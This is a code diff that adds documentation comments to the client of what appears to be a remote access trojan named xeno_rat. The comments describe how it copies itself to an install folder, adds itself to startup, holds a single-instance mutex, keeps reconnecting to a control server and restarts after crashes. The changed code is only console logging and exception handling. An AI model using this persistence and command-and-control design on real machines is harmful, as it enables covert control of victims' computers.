@@ -27,6 +27,19 @@ namespace xeno_rat_client
 
         public static StringBuilder ProcessLog = new StringBuilder();
 
+        /// <summary>
+        /// Main method for the application, which sets up the environment and starts the main loop for handling socket connections.
+        /// </summary>
+        /// <param name="args">The command-line arguments passed to the application.</param>
+        /// <returns>An asynchronous task representing the execution of the Main method.</returns>
+        /// <remarks>
+        /// This method sets up the console output capture, handles unhandled exceptions, and checks for administrative privileges.
+        /// If the installation path is set, it attempts to copy the application to the specified directory and start it from there.
+        /// It then creates a mutex to ensure single instance execution and delays for a specified time.
+        /// If DoStartup flag is set, it adds the application to startup, and then enters a loop to handle socket connections.
+        /// Within the loop, it attempts to connect to a server, sets up the connection, and receives data using a custom handler.
+        /// If an exception occurs during the socket handling, it delays for 10 seconds and prints the exception message to the console.
+        /// </remarks>
         static async Task Main(string[] args)
         {
             CapturingConsoleWriter ConsoleCapture = new CapturingConsoleWriter(Console.Out);
@@ -103,11 +116,24 @@ namespace xeno_rat_client
             }
         }
 
+        /// <summary>
+        /// Prints the connection status of the main node to the console.
+        /// </summary>
+        /// <param name="MainNode">The main node whose connection status is to be checked and printed.</param>
         public static void OnDisconnect(Node MainNode) 
         {
             Console.WriteLine(MainNode.Connected());
         }
 
+        /// <summary>
+        /// Handles the unhandled exceptions in the current application domain.
+        /// </summary>
+        /// <param name="sender">The source of the unhandled exception event.</param>
+        /// <param name="e">An <see cref="UnhandledExceptionEventArgs"/> that contains the event data.</param>
+        /// <remarks>
+        /// This method handles the unhandled exceptions in the current application domain by sending the exception details to the server's sub-nodes with a heartbeat socket type.
+        /// It then restarts the application by starting a new process and terminates the current process.
+        /// </remarks>
         static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
         {
             Exception exception = e.ExceptionObject as Exception;
@@ -143,25 +169,47 @@ namespace xeno_rat_client
 
         public override Encoding Encoding => originalOut.Encoding;
 
+        /// <summary>
+        /// Writes a character to the standard output stream and captures the output.
+        /// </summary>
+        /// <param name="value">The character to be written to the standard output stream.</param>
+        /// <remarks>
+        /// This method captures the output by appending the <paramref name="value"/> to the ProcessLog and then continues to write to the original output stream.
+        /// </remarks>
         public override void Write(char value)
         {
             Program.ProcessLog.Append(value);  // Capture the output
             originalOut.Write(value);  // Continue to write to the original output
         }
 
+        /// <summary>
+        /// Writes a string to the output and captures it with a new line in the process log.
+        /// </summary>
+        /// <param name="value">The string to be written to the output.</param>
+        /// <remarks>
+        /// This method captures the output with a new line in the process log using <see cref="Program.ProcessLog"/> and continues to write to the original output using <see cref="originalOut"/>.
+        /// </remarks>
         public override void WriteLine(string value)
         {
             Program.ProcessLog.AppendLine(value);  // Capture the output with a new line
             originalOut.WriteLine(value);  // Continue to write to the original output
         }
 
-        // You can add other overrides if needed
-
+        /// <summary>
+        /// Returns the captured output from the ProcessLog as a string.
+        /// </summary>
+        /// <returns>The captured output from the ProcessLog as a string.</returns>
         public string GetCapturedOutput()
         {
             return Program.ProcessLog.ToString();
         }
 
+        /// <summary>
+        /// Clears the captured output in the ProcessLog.
+        /// </summary>
+        /// <remarks>
+        /// This method clears the captured output in the ProcessLog, effectively emptying it.
+        /// </remarks>
         public void ClearCapturedOutput()
         {
             Program.ProcessLog.Clear();
